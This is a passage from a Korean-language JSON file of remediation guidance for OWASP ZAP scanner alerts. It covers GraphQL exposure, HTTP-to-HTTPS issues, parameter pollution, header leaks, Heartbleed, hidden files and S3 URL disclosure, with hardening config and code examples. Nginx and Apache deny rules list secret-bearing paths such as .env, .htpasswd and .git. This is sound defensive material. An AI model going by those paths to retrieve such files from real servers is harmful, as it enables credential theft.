      "**운영 환경에서 인트로스펙션 비활성화 또는 제한:** 운영 환경에서는 인트로스펙션 쿼리를 완전히 비활성화하거나, 인증된 사용자(예: 관리자)에게만 허용하도록 설정합니다.",
      "**강력한 인증 및 권한 부여 구현:** 인트로스펙션을 허용하더라도, 스키마에 포함된 민감한 필드나 타입에 대한 접근은 적절한 인증 및 권한 부여 로직을 통해 제어합니다.",
      "**APQ (Automatic Persisted Queries) 사용 고려:** 클라이언트에서 미리 정의된 쿼리만 서버에서 실행되도록 허용하여, 인트로스펙션 없이도 클라이언트-서버 간 통신을 유지할 수 있습니다.",
      "**데이터 노출 최소화:** 스키마 설계 시 민감한 정보가 불필요하게 노출되지 않도록 하고, 필드 레벨에서 접근 제어를 철저히 구현합니다."
    ],
    "example_graphql_apollo_server_secure": "// Apollo Server (Node.js) 예시 (인트로스펙션 비활성화)\nconst { ApolloServer } = require('apollo-server');\nconst typeDefs = require('./schema');\nconst resolvers = require('./resolvers');\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  introspection: process.env.NODE_ENV !== 'production', // 운영 환경에서 비활성화\n  // playground: false, // GraphQL Playground도 운영 환경에서는 비활성화 고려\n});\n\nserver.listen().then(({ url }) => {\n  console.log(`🚀 Server ready at ${url}`);\n});"
  },
  "GraphQL Server Implementation Identified": {
    "translated": "GraphQL 서버 구현 식별 – 사용 중인 GraphQL 서버의 종류가 확인됨",
    "description": "ZAP이 웹 애플리케이션에서 GraphQL 서버 구현이 감지되었음을 알리는 정보성 알림입니다. 이는 취약점 자체라기보다는 GraphQL을 사용하고 있음을 식별하여, GraphQL 특유의 잠재적 취약점(예: 인트로스펙션 노출, 과도한 데이터 노출, N+1 문제로 인한 DoS 등)에 대한 추가 보안 검토가 필요함을 시사합니다.",
    "solution_guidelines": [
      "**ExtensionGraphQl** 및 **GraphQL Endpoint Supports Introspection** 취약점의 해결 가이드라인을 참조하십시오.",
      "**쿼리 깊이 및 복잡도 제한:** 과도하게 깊거나 복잡한 쿼리로 인한 서비스 거부(DoS) 공격을 방지하기 위해 쿼리 깊이 제한 및 복잡도 제한을 구현합니다.",
      "**데이터 로더(DataLoader) 패턴 사용:** N+1 쿼리 문제를 방지하여 데이터베이스 부하를 줄이고 성능을 개선합니다.",
      "**벌크(Batch) 작업 최적화:** 여러 개의 개별 요청 대신 단일 벌크 작업을 지원하여 네트워크 오버헤드를 줄이고 효율성을 높입니다.",
      "**적절한 로깅 및 모니터링:** GraphQL 서버에 대한 요청 및 응답을 모니터링하고, 잠재적인 악의적 쿼리를 탐지하기 위한 로깅 시스템을 구축합니다."
    ],
    "example_graphql_guideline_advanced": "# GraphQL 서버 추가 보안 가이드라인\n# 1. 쿼리 깊이 제한 (Query Depth Limiting)\n# 2. 쿼리 복잡도 분석 (Query Complexity Analysis)\n# 3. 데이터 로더 (DataLoader) 패턴 구현\n# 4. 지속적 쿼리 (Persisted Queries) 활용\n# 5. 상세한 로깅 및 이상 탐지 시스템 구축"
  },
  "HTTP Only Site": {
    "translated": "HTTP 전용 사이트 – 웹사이트가 HTTP만 사용하여 통신이 암호화되지 않는 취약점",
    "description": "웹사이트가 HTTP를 통해 접근 가능함을 알리는 정보성 알림입니다. 웹사이트가 HTTPS를 사용하지 않거나, HTTP와 HTTPS 모두를 허용할 경우, 민감한 정보(예: 로그인 자격 증명, 세션 쿠키)가 암호화되지 않은 상태로 전송되어 중간자 공격(Man-in-the-Middle)에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**모든 웹사이트에 HTTPS 강제 적용:** HTTP 요청을 모두 HTTPS로 리다이렉트하여 웹사이트의 모든 통신이 암호화되도록 합니다.",
      "**HSTS (HTTP Strict Transport Security) 헤더 설정:** `Strict-Transport-Security` 헤더를 설정하여 브라우저가 지정된 기간 동안 해당 도메인에 대한 모든 요청을 HTTPS로만 전송하도록 강제합니다.",
      "**'Secure' 플래그가 설정된 쿠키 사용:** 모든 민감한 쿠키에는 'Secure' 플래그를 설정하여 HTTPS 연결에서만 전송되도록 합니다.",
      "**혼합 콘텐츠(Mixed Content) 방지:** HTTPS 페이지에서 HTTP 리소스(스크립트, 이미지, 스타일시트 등)를 로드하지 않도록 하여 보안 경고를 방지하고 사용자의 신뢰를 유지합니다."
    ],
    "example_nginx_https_redirect": "# Nginx HTTP to HTTPS 강제 리다이렉트 예시\nserver {\n    listen 80;\n    server_name your-domain.com www.your-domain.com;\n    return 301 https://$host$request_uri; # 모든 HTTP 요청을 HTTPS로 리다이렉트\n}\n\nserver {\n    listen 443 ssl;\n    server_name your-domain.com www.your-domain.com;\n\n    ssl_certificate /etc/nginx/ssl/your-domain.crt;\n    ssl_certificate_key /etc/nginx/ssl/your-domain.key;\n\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; # HSTS 설정\n    # ... 나머지 설정 ...\n}"
  },
  "HTTP Parameter Override": {
    "translated": "HTTP 매개변수 오버라이드 – URL 파라미터 조작으로 애플리케이션 로직을 변경할 수 있음",
    "description": "HTTP 요청에서 동일한 이름의 파라미터가 여러 번 전송될 때, 웹 서버나 웹 애플리케이션 프레임워크가 이를 처리하는 방식에 따라 마지막 값이 아닌 다른 값이 사용되어, 공격자가 의도된 값을 우회하거나 조작할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**파라미터 처리 방식 통일:** 웹 서버와 애플리케이션 프레임워크가 동일한 파라미터 이름에 대해 어떤 값을 사용하는지 명확히 이해하고, 이를 일관되게 처리하도록 설정합니다 (대부분 마지막 값을 사용하도록 권장).",
      "**입력값 검증 강화:** 모든 사용자 입력 파라미터에 대해 예상되는 값의 범위와 형식을 엄격하게 검증합니다. 비정상적인 중복 파라미터는 탐지하여 거부하거나 경고를 발생시킵니다.",
      "**민감한 파라미터에 대한 추가 보안:** 인증, 권한 부여, 상태 변경과 관련된 민감한 파라미터는 중복 사용 여부를 더욱 철저히 검사하고, 서버 측에서 신뢰할 수 있는 방식으로만 값을 설정하도록 합니다."
    ],
    "example_general_guideline": "# HTTP Parameter Override 방어 가이드라인\n# 1. 서버/프레임워크의 중복 파라미터 처리 방식 이해\n# 2. 모든 파라미터에 대한 엄격한 서버 측 입력값 검증\n# 3. 민감한 파라미터는 중복 검사 및 화이트리스트 기반 처리"
  },
  "HTTP Parameter Pollution": {
    "translated": "HTTP 매개변수 오염 – 동일한 파라미터 중복으로 예상치 못한 동작을 유발하거나 공격에 사용될 수 있음",
    "description": "공격자가 동일한 이름의 HTTP 파라미터를 여러 번 삽입하여 웹 애플리케이션에 전송할 때, 서버 측에서 이 파라미터들을 처리하는 방식(예: 첫 번째 값만 사용, 마지막 값만 사용, 모든 값을 배열로 처리 등)의 차이로 인해 로직 우회나 데이터 조작이 발생할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**파라미터 처리 방식 명확화 및 일관성 유지:** 애플리케이션은 중복된 파라미터에 대해 일관되고 예측 가능한 방식으로 값을 처리해야 합니다. 일반적으로 첫 번째 값만 사용하거나, 모든 값을 배열로 받아 명시적으로 처리하는 것이 안전합니다.",
      "**모든 사용자 입력에 대한 강력한 유효성 검사:** 애플리케이션의 핵심 로직에서 사용되는 모든 파라미터에 대해 엄격한 서버 측 유효성 검사를 수행하여 예상치 못한 값이나 형식을 필터링합니다.",
      "**입력값 배열 처리:** `action=delete&id=1&id=2` 와 같이 여러 ID를 받는 경우, 명시적으로 `id`를 배열로 처리하도록 하여 의도된 동작을 벗어나지 않도록 합니다.",
      "**보안 코딩 표준 준수:** 파라미터 값을 사용할 때는 항상 예상되는 하나의 값만 사용하도록 주의하고, 불필요한 값은 무시하거나 에러 처리합니다."
    ],
    "example_java_servlet_hpp": "// Java Servlet 예시 (HTTP Parameter Pollution 방어)\n// request.getParameter()는 첫 번째 값만 반환\n// request.getParameterValues()는 모든 값을 배열로 반환\n\n@WebServlet(\"/processOrder\")\npublic class OrderServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // 안전한 처리: 첫 번째 값만 사용하거나, 배열로 받아 명시적으로 처리\n        String orderId = request.getParameter(\"orderId\"); // \"orderId=1&orderId=2\" 일 경우 \"1\" 반환\n        String[] itemIds = request.getParameterValues(\"itemId\"); // \"itemId=A&itemId=B\" 일 경우 [\"A\", \"B\"] 반환\n\n        if (orderId == null || !orderId.matches(\"\\\\d+\")) { // 숫자 유효성 검사\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid order ID\");\n            return;\n        }\n\n        // itemIds 배열에 대한 추가적인 유효성 검사 및 처리\n        if (itemIds != null && itemIds.length > 5) { // 예시: 아이템 개수 제한\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Too many items\");\n            return;\n        }\n\n        // 로직 처리...\n        response.getWriter().println(\"Order processed for ID: \" + orderId);\n    }\n}"
  },
  "HTTP Server Response Header": {
    "translated": "HTTP 서버 응답 헤더 – HTTP 응답에 서버 관련 정보 헤더가 있는지 확인",
    "description": "HTTP 응답 헤더에 서버 소프트웨어의 종류와 버전(예: `Server: Apache/2.4.6 (CentOS)`, `X-Powered-By: ASP.NET`)과 같은 정보가 노출되어 공격자가 서버의 취약점을 파악하는 데 도움을 줄 수 있는 정보성 알림입니다.",
    "solution_guidelines": [
      "**서버 시그니처 비활성화 또는 변경:** 웹 서버(Apache, Nginx, IIS) 및 애플리케이션 서버(Tomcat, JBoss 등)의 설정을 수정하여 `Server`, `X-Powered-By`, `X-AspNet-Version` 등의 헤더가 응답에 포함되지 않도록 하거나, 일반적인 값으로 변경합니다.",
      "**리버스 프록시/로드 밸런서 사용:** 웹 서버 앞에 리버스 프록시(예: Nginx, Cloudflare)나 로드 밸런서를 두어 실제 백엔드 서버의 정보를 숨깁니다.",
      "**CMS/프레임워크 관련 헤더 제거:** 사용 중인 CMS나 프레임워크(예: WordPress, Joomla, ASP.NET, PHP)에서 자동으로 추가하는 관련 헤더를 제거하거나 비활성화합니다.",
      "**보안 헤더 추가:** `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` 등과 같은 보안 관련 HTTP 헤더를 추가하여 전반적인 보안을 강화합니다."
    ],
    "example_nginx_hide_headers": "# Nginx 설정 예시 (Server, X-Powered-By 헤더 숨기기)\nserver {\n    # ...\n    server_tokens off; # Server 헤더 버전 정보 숨기기\n    # ...\n\n    # X-Powered-By 헤더 제거 (프로그램적으로 처리해야 할 수도 있음)\n    # proxy_hide_header X-Powered-By;\n    # fastcgi_hide_header X-Powered-By;\n}",
    "example_apache_hide_headers": "# Apache httpd.conf 설정 예시\nServerTokens Prod # Server 헤더에 버전 정보만 (Apache)\nServerSignature Off # 에러 페이지 하단 서명 비활성화\nHeader unset X-Powered-By # X-Powered-By 헤더 제거 (mod_headers 모듈 필요)"
  },
  "HTTP to HTTPS Insecure Transition in Form Post": {
    "translated": "HTTP에서 HTTPS로의 불안전한 폼 전송 전환 – HTTP 페이지에서 HTTPS로 폼 데이터 전송 시 정보가 노출될 수 있음",
    "description": "사용자가 HTTP 페이지에서 HTTPS 페이지로 폼 데이터를 POST 방식으로 전송할 때 발생하는 취약점입니다. 초기 HTTP 페이지에서 폼이 로드되는 동안 중간자 공격자가 폼 액션 URL을 변조하거나, 사용자 입력값을 가로챌 수 있습니다. 특히 로그인 정보와 같은 민감한 데이터 전송 시 위험합니다.",
    "solution_guidelines": [
      "**모든 페이지에 HTTPS 강제 적용:** 웹사이트의 모든 페이지를 HTTPS로만 제공하여 HTTP에서 시작하는 어떠한 민감한 폼 제출도 발생하지 않도록 합니다.",
      "**HSTS (HTTP Strict Transport Security) 헤더 설정:** `Strict-Transport-Security` 헤더를 설정하여 브라우저가 지정된 기간 동안 해당 도메인에 대한 모든 요청을 HTTPS로만 전송하도록 강제합니다.",
      "**`action` URL 절대 경로 사용:** 폼의 `action` 속성에 HTTPS로 시작하는 절대 URL을 명시적으로 사용합니다. (물론, 가장 좋은 방법은 페이지 자체를 HTTPS로 제공하는 것)"
    ],
    "example_general_https": "# 웹사이트 전체 HTTPS 적용 권장\n# 1. HTTP 요청은 모두 HTTPS로 301 리다이렉트\n# 2. HSTS (Strict-Transport-Security) 헤더 사용\n# 3. 모든 링크, 리소스 로드 경로 HTTPS 사용 (혼합 콘텐츠 방지)"
  },
  "HTTPS Content Available via HTTP": {
    "translated": "HTTPS 콘텐츠가 HTTP로도 접근 가능 – HTTPS로 제공되어야 할 콘텐츠가 HTTP로도 접근 가능하여 보안이 저하됨",
    "description": "동일한 웹 콘텐츠가 HTTPS와 HTTP를 통해 모두 접근 가능한 경우입니다. 이는 사용자가 실수로 HTTP 버전에 접근하여 암호화되지 않은 통신을 하게 될 위험이 있으며, 검색 엔진이 HTTP 버전을 인덱싱하여 보안에 취약한 URL을 노출할 수도 있습니다.",
    "solution_guidelines": [
      "**모든 HTTP 요청을 HTTPS로 301 리다이렉트:** 웹 서버 설정에서 HTTP 요청을 HTTPS URL로 영구적으로 리다이렉트하여, HTTP를 통한 접근을 완전히 차단합니다.",
      "**HSTS (HTTP Strict Transport Security) 헤더 설정:** HSTS 헤더를 사용하여 브라우저가 해당 도메인에 대한 모든 요청을 HTTPS로만 전송하도록 강제하여, 사용자가 직접 HTTP를 입력해도 HTTPS로 연결되도록 합니다.",
      "**정규화된 URL (Canonical URL) 사용:** HTML 페이지의 `<head>` 태그 내에 `<link rel=\"canonical\" href=\"https://...\">`를 사용하여 검색 엔진이 HTTPS 버전을 우선적으로 인덱싱하도록 안내합니다."
    ],
    "example_nginx_redirect_hsts": "# Nginx HTTP to HTTPS 강제 리다이렉트 및 HSTS 예시\nserver {\n    listen 80;\n    server_name your-domain.com www.your-domain.com;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 443 ssl;\n    server_name your-domain.com www.your-domain.com;\n    # SSL/TLS 설정 ...\n\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n    # ...\n}"
  },
  "HTTPS to HTTP Insecure Transition in Form Post": {
    "translated": "HTTPS에서 HTTP로의 불안전한 폼 전송 전환 – HTTPS 페이지에서 HTTP로 폼 데이터 전송 시 정보가 노출될 수 있음",
    "description": "사용자가 HTTPS 페이지에서 HTTP 페이지로 폼 데이터를 POST 방식으로 전송할 때 발생하는 심각한 취약점입니다. 암호화된 HTTPS 연결에서 입력된 민감한 정보가 암호화되지 않은 HTTP 연결을 통해 전송되어 중간자 공격자에게 쉽게 노출될 수 있습니다.",
    "solution_guidelines": [
      "**절대 HTTPS에서 HTTP로 폼 제출 금지:** 모든 폼 제출은 동일한 HTTPS 연결 또는 다른 안전한 HTTPS 엔드포인트로 이루어져야 합니다. HTTP 엔드포인트로의 직접적인 폼 제출은 절대로 허용하지 않습니다.",
      "**모든 웹사이트에 HTTPS 강제 적용:** 웹사이트의 모든 페이지와 모든 리소스가 HTTPS를 통해서만 제공되도록 합니다.",
      "**개발 및 QA 단계에서 확인:** 폼의 `action` 속성이 항상 HTTPS URL을 가리키는지, 그리고 프로토콜이 다운그레이드되지 않는지 철저히 테스트합니다."
    ],
    "example_html_form_secure": "<form action=\"https://www.your-domain.com/submit_secure_data\" method=\"post\">\n    <label for=\"username\">Username:</label>\n    <input type=\"text\" id=\"username\" name=\"username\"><br><br>\n    <label for=\"password\">Password:</label>\n    <input type=\"password\" id=\"password\" name=\"password\"><br><br>\n    <input type=\"submit\" value=\"Submit\">\n</form>"
  },
  "HUNT Methodology": {
    "translated": "HUNT 방법론 – 웹 애플리케이션 침투 테스트에 사용되는 방법론 기반 스캔",
    "description": "ZAP의 HUNT Methodology는 단순히 특정 취약점을 지칭하는 것이 아니라, Penetration Testing Execution Standard(PTES)를 기반으로 하는 ZAP의 일련의 자동화된 테스트 및 스캐닝 방법론을 의미합니다. 이는 다양한 보안 취약점 유형을 포괄적으로 탐지하기 위한 ZAP의 내부 메커니즘이므로, 직접적인 '해결책'보다는 '종합적인 보안 강화를 위한 접근 방식'을 요구합니다.",
    "solution_guidelines": [
      "**정기적인 ZAP 스캐닝 및 분석:** ZAP의 HUNT Methodology를 포함한 모든 자동화 스캐닝을 정기적으로 수행하고, 탐지된 모든 알림(Alert)에 대해 상세하게 분석합니다.",
      "**ZAP 보고서 기반 취약점 패치:** ZAP 스캐닝 결과를 바탕으로 식별된 각각의 취약점에 대해 적절한 보안 패치를 적용하고, 재스캐닝을 통해 해결 여부를 확인합니다.",
      "**보안 개발 수명 주기(SDLC) 통합:** 개발 초기 단계부터 보안을 고려하는 Secure SDLC를 도입하여 설계, 구현, 테스트, 배포 전 과정에서 보안 취약점을 예방하고 탐지합니다.",
      "**자동화된 보안 테스트 파이프라인 구축:** CI/CD 파이프라인에 ZAP과 같은 DAST(Dynamic Application Security Testing) 도구를 통합하여 빌드 또는 배포 시마다 자동으로 보안 테스트를 수행합니다.",
      "**전문가 보안 감사 및 모의 해킹:** 자동화된 도구만으로는 발견하기 어려운 취약점을 위해 전문 보안 업체의 수동 모의 해킹 및 코드 감사(Code Review)를 병행합니다."
    ],
    "example_general_security_practice": "# HUNT Methodology에 대응하는 종합 보안 강화 가이드라인\n# 1. ZAP을 포함한 보안 도구의 정기적인 자동/수동 스캐닝\n# 2. 모든 탐지된 취약점에 대한 체계적인 분석 및 패치\n# 3. 개발 프로세스 전반에 걸친 보안 강화 (Secure SDLC)\n# 4. CI/CD 파이프라인에 보안 테스트 통합\n# 5. 전문가의 보안 감사 및 모의 해킹 수행"
  },
  "Hash Disclosure - MD4 / MD5": {
    "translated": "해시 정보 노출 - MD4 / MD5 – 약한 해시 알고리즘(MD4/MD5)으로 암호화된 정보가 노출되는 취약점",
    "description": "응답 헤더, 페이지 콘텐츠, 또는 기타 채널을 통해 MD4 또는 MD5와 같이 안전하지 않은 해싱 알고리즘으로 생성된 해시 값이 노출되는 취약점입니다. MD4와 MD5는 현재 충돌 공격에 취약하여 비밀번호 해싱 등 보안 목적으로 사용하기에 부적합합니다.",
    "solution_guidelines": [
      "**안전한 해싱 알고리즘으로 전환:** 비밀번호 해싱에는 PBKDF2, bcrypt, scrypt, Argon2와 같이 솔트(salt)와 반복 횟수(iteration count)를 지원하는 강력한 단방향 해싱 알고리즘을 사용합니다.",
      "**솔트(Salt) 사용:** 비밀번호를 해싱할 때는 각 사용자마다 고유한 솔트를 생성하여 해시 충돌 공격 및 무지개 테이블(rainbow table) 공격을 방지합니다.",
      "**해싱된 정보 노출 금지:** 웹 페이지 응답, 로그 파일, 에러 메시지 등 어떤 형태로든 해싱된 비밀번호나 기타 민감한 정보가 외부에 노출되지 않도록 합니다.",
      "**해싱 용도 재평가:** MD4/MD5가 파일 무결성 검증과 같은 보안에 덜 중요한 용도로 사용되는 경우에도, SHA-256과 같은 더 안전한 알고리즘으로 전환하는 것을 권장합니다."
    ],
    "example_python_password_hashing": "# Python 비밀번호 해싱 예시 (bcrypt 사용)\nimport bcrypt\n\ndef hash_password(password):\n    # 비밀번호 해싱\n    hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\n    return hashed_password.decode('utf-8')\n\ndef verify_password(password, hashed_password):\n    # 비밀번호 검증\n    return bcrypt.checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))\n\n# 사용 예시\n# user_password = \"mySecretPassword123\"\n# hashed = hash_password(user_password)\n# print(f\"Hashed password: {hashed}\")\n# print(f\"Verification result: {verify_password(user_password, hashed)}\")"
  },
  "Heartbleed OpenSSL Vulnerability": {
    "translated": "하트블리드 OpenSSL 취약점 – OpenSSL의 하트블리드 취약점으로 인해 메모리 정보가 유출될 수 있음",
    "description": "Heartbleed(CVE-2014-0160)는 OpenSSL 라이브러리의 Heartbeat 확장 기능 구현 오류로 인해 발생했던 심각한 취약점입니다. 공격자가 서버의 메모리에서 민감한 정보(개인 키, 세션 토큰, 비밀번호 등)를 유출할 수 있었습니다.",
    "solution_guidelines": [
      "**OpenSSL 최신 버전으로 업데이트:** Heartbleed 취약점이 패치된 OpenSSL의 최신 버전으로 즉시 업데이트합니다. (최소 1.0.1g 이상)",
      "**영향받는 시스템 전체 재시작:** OpenSSL 라이브러리 업데이트 후에는 서버 애플리케이션 및 웹 서버를 포함한 모든 관련 시스템을 재시작하여 새로운 라이브러리가 로드되도록 합니다.",
      "**모든 개인 키(Private Key) 재발급 및 인증서 갱신:** 취약점 노출 기간 동안 유출되었을 가능성이 있는 모든 SSL/TLS 개인 키를 재발급하고, 해당 인증서를 갱신합니다.",
      "**사용자 비밀번호 재설정 요구:** 유출 가능성이 있는 모든 사용자들에게 비밀번호 재설정을 강제하고, 세션 토큰을 무효화합니다."
    ],
    "example_general_patching": "# Heartbleed 취약점 대응 가이드라인\n# 1. OpenSSL 라이브러리 최신 버전으로 즉시 업데이트 (패치)\n# 2. 서버 및 관련 서비스 전체 재시작\n# 3. 모든 SSL/TLS 개인 키 재발급 및 인증서 갱신\n# 4. 사용자 비밀번호 재설정 및 세션 무효화"
  },
  "Heartbleed OpenSSL Vulnerability (Indicative)": {
    "translated": "하트블리드 OpenSSL 취약점 (징후) – OpenSSL 하트블리드 취약점의 징후가 보임",
    "description": "Heartbleed 취약점(CVE-2014-0160)의 존재 가능성을 나타내는 지표가 발견되었음을 알리는 정보성 알림입니다. 직접적인 공격 성공을 의미하지는 않지만, 잠재적 위험이 있으므로 Heartbleed 취약점의 해결 가이드라인을 따라 조치해야 합니다.",
    "solution_guidelines": [
      "**Heartbleed OpenSSL Vulnerability** 취약점의 해결 가이드라인을 참조하십시오.",
      "이는 'indicative' (지표성) 알림이므로, 추가적인 확인과 함께 선제적으로 패치 및 관련 조치를 수행하는 것이 중요합니다."
    ]
  },
  "Hidden File Found": {
    "translated": "숨겨진 파일 발견 – .git, .svn 등 숨겨진 버전 관리 파일이나 임시 파일이 발견됨",
    "description": "웹 서버에 웹 루트 외부의 `.git`, `.svn`, `.DS_Store` 또는 기타 숨겨진 설정/시스템 파일이 노출되어 있거나, 웹을 통해 접근 가능한 위치에 배치되어 민감한 정보(소스 코드, 버전 관리 정보, 백업 파일, 개발자 정보 등)가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**숨겨진 파일 및 디렉토리 웹 접근 차단:** 웹 서버 설정(Apache, Nginx 등)을 통해 `.git`, `.svn`, `.DS_Store`, `.env`, `web.config.bak` 등 숨겨진 파일 및 백업 파일에 대한 직접적인 웹 접근을 명시적으로 거부합니다.",
      "**웹 루트 외부에 민감한 파일 저장:** 개발 관련 파일, 구성 파일, 백업 파일 등 민감한 파일은 웹 서버의 접근이 불가능한 웹 루트 외부 디렉토리에 저장합니다.",
      "**`.gitignore` 및 버전 관리 도구 설정:** `.gitignore` 파일을 사용하여 버전 관리 시스템(Git)에 민감한 파일이나 설정 파일이 커밋되지 않도록 합니다.",
      "**배포 시 불필요한 파일 제거:** 개발/테스트 환경에서 사용되는 불필요한 파일이나 디렉토리가 운영 환경에 배포되지 않도록 빌드 및 배포 프로세스를 검토합니다."
    ],
    "example_nginx_hide_files": "# Nginx 설정 예시 (숨겨진 파일 접근 차단)\nlocation ~ /(\\.git|\\.svn|\\.hg|\\.bzr|\\.DS_Store|\\.env|composer\\.json|package\\.json|package-lock\\.json|yarn\\.lock|\\.htaccess|\\.htpasswd) {\n    deny all;\n}",
    "example_apache_hide_files": "# Apache .htaccess 예시\n<FilesMatch \"^\\.(git|svn|ht|DS_Store|env|composer\\.json|package\\.json|package-lock\\.json|yarn\\.lock).*\">\n    Order Allow,Deny\n    Deny from all\n</FilesMatch>"
  },
  "Httpoxy - Proxy Header Misuse": {
    "translated": "Httpoxy - 프록시 헤더 오용 – Proxy 헤더를 조작하여 악성 프록시를 사용하도록 유도하는 취약점",
    "description": "Httpoxy는 특정 조건에서 웹 애플리케이션이 HTTP `Proxy` 헤더를 환경 변수 `HTTP_PROXY`로 해석하여, 공격자가 프록시 설정을 조작하고 웹 애플리케이션의 아웃바운드 요청을 제어할 수 있게 하는 취약점입니다. 이는 중간자 공격이나 내부 네트워크 접근으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**웹 서버 패치 및 업데이트:** 웹 서버(Apache, Nginx 등) 및 PHP, Python, Go 등 사용 중인 언어 런타임/프레임워크를 Httpoxy 취약점이 패치된 최신 버전으로 업데이트합니다.",
      "**HTTP `Proxy` 헤더 제거 또는 필터링:** 웹 서버나 로드 밸런서 단계에서 들어오는 HTTP `Proxy` 헤더를 제거하거나, 애플리케이션으로 전달되기 전에 필터링합니다.",
      "**HTTP `Proxy` 환경 변수 무시:** 애플리케이션 코드에서 `HTTP_PROXY` 환경 변수를 사용하지 않거나, 외부에서 주입된 값에 대해 유효성을 철저히 검증하도록 합니다.",
      "**최소 권한 원칙:** 웹 애플리케이션이 외부 네트워크에 접속할 때 필요한 최소한의 권한과 접근만 허용하도록 네트워크 정책을 구성합니다."
    ],
    "example_nginx_proxy_header": "# Nginx 설정 예시 (Proxy 헤더 제거)\nproxy_set_header Proxy \"\"; # 들어오는 Proxy 헤더를 빈 값으로 덮어씀"
  },
  "Image Exposes Location or Privacy Data": {
    "translated": "이미지 파일 위치 또는 개인 정보 노출 – 이미지 메타데이터(EXIF)에 위치 정보나 개인 정보가 포함되어 노출될 수 있음",
    "description": "이미지 파일(예: JPEG)에 EXIF(Exchangeable Image File Format) 데이터 형태로 위치 정보(GPS 좌표), 촬영 시간, 카메라 모델, 소유자 정보 등 민감한 개인 정보가 포함되어 웹을 통해 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**이미지 업로드 시 EXIF 데이터 제거:** 사용자가 이미지를 업로드할 때, 서버 측에서 모든 EXIF 데이터를 자동으로 제거하는 처리를 수행합니다. (예: 라이브러리 사용)",
      "**클라이언트 측 EXIF 제거 경고:** 이미지를 업로드하는 사용자에게 EXIF 데이터에 민감 정보가 포함될 수 있으며, 업로드 시 제거된다는 사실을 안내합니다.",
      "**불필요한 이미지 메타데이터 제거:** EXIF 외에도 이미지 파일에 포함될 수 있는 다른 형태의 메타데이터(IPTC, XMP 등)도 검토하고 제거하는 것을 고려합니다."
    ],
    "example_python_exif_removal": "# Python EXIF 데이터 제거 예시 (Pillow 라이브러리 사용)\nfrom PIL import Image\nfrom PIL.ExifTags import TAGS\n\ndef remove_exif_data(image_path, output_path):\n    try:\n        img = Image.open(image_path)\n        data = list(img.getdata())\n        image_without_exif = Image.new(img.mode, img.size)\n        image_without_exif.putdata(data)\n        image_without_exif.save(output_path)\n        print(f\"EXIF data removed from {image_path} and saved to {output_path}\")\n    except Exception as e:\n        print(f\"Error processing image {image_path}: {e}\")\n\n# 사용 예시\n# remove_exif_data('input.jpg', 'output_no_exif.jpg')"
  },
  "In Page Banner Information Leak": {
    "translated": "페이지 배너 내 정보 노출 – 웹 페이지 배너 또는 특정 영역에 서버 정보 등이 노출됨",
    "description": "웹 페이지 내의 배너, 푸터, 주석 등에서 서버 소프트웨어 버전, 프레임워크 버전, 개발 언어 버전, 또는 기타 내부 시스템 정보가 노출되는 취약점입니다. 이는 공격자가 해당 버전의 알려진 취약점을 검색하고 공격을 시도하는 데 활용될 수 있습니다.",
    "solution_guidelines": [
      "**페이지 내 정보 제거:** HTML, CSS, JavaScript 파일 내에 하드코딩된 서버/프레임워크 버전 정보, 개발자 정보, 내부 시스템 경로 등을 모두 제거합니다.",
      "**동적으로 생성되는 정보 제거:** 서버 측에서 자동으로 추가하는 버전 정보(예: PHP의 `X-Powered-By` 헤더, ASP.NET의 버전 정보)는 설정을 통해 비활성화하거나 제거합니다.",
      "**주석 및 개발자 노트 검토:** 사용자에게 노출되는 페이지의 HTML 주석에 민감한 정보나 힌트가 포함되어 있지 않은지 확인하고 제거합니다.",
      "**오류 메시지 최소화:** 상세한 오류 메시지(스택 트레이스, 경로 정보 등)가 사용자에게 직접 노출되지 않도록 설정합니다."
    ],
    "example_php_hide_version": "// PHP.ini 설정 예시 (X-Powered-By 헤더 숨기기)\n// expose_php = Off\n\n// 또는 Apache/Nginx 설정에서 X-Powered-By 헤더 제거\n# Apache\n# Header unset X-Powered-By\n\n# Nginx\n# fastcgi_hide_header X-Powered-By;"
  },
  "Information Disclosure - Amazon S3 Bucket URL": {
    "translated": "정보 노출 - Amazon S3 버킷 URL – Amazon S3 버킷 주소가 웹에 직접 노출됨",
    "description": "웹 페이지나 애플리케이션 응답에서 Amazon S3 버킷의 URL(예: `http://bucket-name.s3.amazonaws.com/`)이 노출되는 취약점입니다. 이는 버킷의 존재를 알려주고, 버킷 접근 정책이 잘못 설정되어 있을 경우 민감한 파일이 공개될 위험이 있습니다.",
    "solution_guidelines": [
      "**S3 버킷 접근 정책 엄격화:** S3 버킷의 ACL(Access Control List)과 버킷 정책(Bucket Policy)을 `Private`으로 설정하거나, 필요한 최소한의 사용자/역할/IP에만 접근을 허용합니다.",
      "**공개 접근 차단:** 버킷이 의도치 않게 'Public'으로 설정되어 있지 않은지 확인하고, 'Block all public access' 옵션을 활성화합니다.",
      "**CDN(CloudFront) 사용:** S3 버킷을 직접 노출하는 대신, Amazon CloudFront와 같은 CDN을 사용하여 S3 콘텐츠를 제공합니다. 이 경우 S3 버킷은 비공개로 유지하고, CloudFront를 통해서만 접근 가능하도록 설정합니다.",
      "**URL 숨기기:** S3 버킷 URL을 직접 노출하는 대신, 애플리케이션 내부에서 프록시하거나, 서명된 URL(Signed URL)을 사용하여 제한된 시간 동안만 접근을 허용합니다."
    ],
